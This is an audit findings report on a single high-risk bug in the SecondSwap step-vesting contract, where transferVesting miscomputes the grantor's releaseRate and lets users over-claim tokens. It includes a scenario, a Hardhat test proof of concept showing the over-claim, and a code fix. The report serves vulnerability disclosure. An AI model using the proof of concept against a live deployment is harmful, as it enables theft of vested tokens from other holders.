# SecondSwap - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)

- ## High Risk Findings
    - ### [H-01. Incorrect releaseRate setting during the transfer of vesting allows the users to claim more than they should.](#H-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: SecondSwap

### Dates: Dec 9th, 2024 - Dec 19rd, 2024

[See more contest details here](https://code4rena.com/reports/2024-12-secondswap)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 1
- Medium: 0
- Low: 0
  


# High Risk Findings

## <a id='H-01'></a>H-01. Incorrect releaseRate setting during the transfer of vesting allows the users to claim more than they should.

## Impact

Incorrect releaseRate setting during the transfer of vesting inside SecondSwap_StepVesting allows the users to claim more than they should.

## Proof of Concept

Vestings can be transferred between users inside the SecondSwap_StepVesting:transferVesting function. This operation can be triggered by token issuers or during listings where a seller transfers part of his vesting tokens to a manager contract, so that the manager contract can later release them to buyers. However, during this operation, the releaseRate for the grantor's address is invalidly calculated as it does not incur if the grantor has already claimed some tokens or not, which will set the releaseRate to a higher value and lead to the grantor being able to claim more tokens.

```solidity
function transferVesting(address _grantor, address _beneficiary, uint256 _amount) external {
      ...
        grantorVesting.totalAmount -= _amount;
@=>     grantorVesting.releaseRate = grantorVesting.totalAmount / numOfSteps;

        _createVesting(_beneficiary, _amount, grantorVesting.stepsClaimed, true);

        emit VestingTransferred(_grantor, _beneficiary, _amount);
    }
```

Follow scenario can happen:

- User A has 10,000 tokens to claim over 10 steps, with a rate of 1,000 per step.
- After 3 steps have passed, User A claims his 3,000 tokens, leaving a total amount of 7,000 tokens to be claimed.
- After this, user A decides he wants to sell 5,000 of his tokens. During this action, SecondSwap_VestingManager will call transferVesting with _grantor as User A, and _beneficiary as the manager address.

```solidity
function listVesting(address seller, address plan, uint256 amount) external onlyMarketplace {
      ...
        SecondSwap_Vesting(plan).transferVesting(seller, address(this), amount);
    }
```

- During this call, the vesting for the grantor will be updated to the following values:
newTotalAmount = 10k - 5k = 5k and newRate = newTotalAmount / numOfSteps = 5k / 10 = 0.5k. Because the newRate does not account for the earlier 3k of claimed tokens, this will leave the user with 7 steps of 0.5k claimed amount, which is not valid, as the user, after selling 5k and initially claiming 3k, should only be left with 2k.
- After 6 more steps have passed, with the new incorrect rate, user A is able to claim 3k of tokens, which bypasses his initial vesting amount (3k from initial claim + 5k sellable amount + 3k of tokens claimed after listing = 11k).

## Coded PoC

Add the following test to the current project test suite as a new file. For simplicity, this test case invokes the transferOfVesting function as the token issuer, so there are no listings and manager interactions.

```solidity
import hre from "hardhat";
import { expect } from "chai";
import { parseEther } from "viem";
import DeployStepVestingAsOwner from "../ignition/modules/DeployStepVestingAsOwner";
import { loadFixture, mine, time } from "@nomicfoundation/hardhat-toolbox-viem/network-helpers";

describe("Incorrect `releaseRate` setting during the transfer of vesting", function () {
    async function deployStepVestingFixture() {
        const [owner,tokenOwner,alice,bob] = await hre.viem.getWalletClients();
        const startTime = BigInt(await time.latest());
        const endTime = startTime + BigInt(60 * 60 * 24 * 10); // 10 days
        const steps = BigInt(10);
        const initialSupply = parseEther("1000000");
        const Vesting = await hre.ignition.deploy(DeployStepVestingAsOwner, {
            parameters: {
                ERC20: {name: "Test Token", symbol: "TT", initialSupply: initialSupply},
                DeployStepVestingAsOwner: { startTime: startTime, endTime: endTime, numOfSteps: steps},
            },
        });
        await Vesting.token.write.transfer([tokenOwner.account.address, parseEther("1000000")]);
        return { vesting: Vesting.vesting, token: Vesting.token, owner, tokenOwner, alice, bob, startTime, endTime, steps};
    }
    it("PoC", async function () {
        const {vesting, token, tokenOwner, alice, bob} = await loadFixture(deployStepVestingFixture);

        // 1. Create vesting for Bob 
        const bobVestingAmount = parseEther("1000");
        await token.write.approve([vesting.address, bobVestingAmount], { account: tokenOwner.account });
        await vesting.write.createVesting([bob.account.address, bobVestingAmount], { account: tokenOwner.account });

        // 2. Skip 3 days (add slightly more), which will make Bob able to claim 3 steps
        await time.increase(60 * 60 * 24 * 3 + 10);
    
        // 3. Let Bob claim his vested tokens for 3 steps, which will leave 700 tokens more to claim
        let bobBalanceBefore = await token.read.balanceOf([bob.account.address]);
        await vesting.write.claim({account: bob.account})
        let bobBalanceAfter = await token.read.balanceOf([bob.account.address]);
        expect(bobBalanceAfter).to.equal(parseEther("300"));

        // 4. Now, let's transfer some of the Bob vested tokens to Alice
        // This should leave Bob with (1000 - 300 - 500) = 200 tokens left to claim
        const aliceVestingAmount = parseEther("500");
        await vesting.write.transferVesting([bob.account.address, alice.account.address, aliceVestingAmount], {account: tokenOwner.account})

        // 5. Skip 6 days (add slightly more), which will make Bob able to claim another 6 steps
        await time.increase(60 * 60 * 24 * 6 + 10);

        // 6. Let Bob claim his vested tokens for 6 steps
        // Because of invalid rate setting, this will allow Bob to claim 300 tokens (more than he should have) 
        bobBalanceBefore = await token.read.balanceOf([bob.account.address]);
        await vesting.write.claim({account: bob.account})
        bobBalanceAfter = await token.read.balanceOf([bob.account.address]);
        let claimed = bobBalanceAfter - bobBalanceBefore;
        console.log("Bob claimed: ", claimed);
        console.log("Bob balance after: ", bobBalanceAfter);

        // Show that Bob was able to claim more than he should have
        expect(claimed).to.greaterThan(parseEther("200"));
    });
});
```

Run `npx hardhat test`

Output:
```solidity
Incorrect `releaseRate` setting during the transfer of vesting
Bob claimed:  300000000000000000000n
Bob balance after:  600000000000000000000n
```

## Recommended mitigation steps

Include previously claimed amounts when updating the releaseRate for the grantor:

```diff
function transferVesting(address _grantor, address _beneficiary, uint256 _amount) external {
    ...
        grantorVesting.totalAmount -= _amount;
+       if (numOfSteps - grantorVesting.stepsClaimed != 0) {
+           grantorVesting.releaseRate = 
+               (grantorVesting.totalAmount - grantorVesting.amountClaimed) /
+               (numOfSteps - grantorVesting.stepsClaimed);
+       } else {
+           grantorVesting.releaseRate = 0;
+       }

        _createVesting(_beneficiary, _amount, grantorVesting.stepsClaimed, true);

        emit VestingTransferred(_grantor, _beneficiary, _amount);
    }
```

## Links to affected code
- SecondSwap_StepVesting.sol#L230